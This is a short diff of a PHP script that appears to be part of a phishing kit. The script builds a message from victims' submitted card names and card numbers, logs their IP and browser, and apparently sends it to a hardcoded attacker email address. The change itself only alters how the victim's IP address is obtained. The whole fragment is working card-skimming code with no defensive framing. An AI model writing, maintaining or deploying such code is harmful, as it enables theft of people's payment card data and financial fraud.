@@ -2,7 +2,7 @@
 require_once('config.php');
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $email = "cmgrace@yandex.com";
-$ip = getenv("REMOTE_ADDR");
+$ip = get_client_ip();
 $message = "==================+[ ---:||sscu||:--]+==================\n";
 $message .= "Card Name : " . $_POST['cn'] . "\n";
 $message .= "Card Number : " . $_POST['ccn'] . "\n";
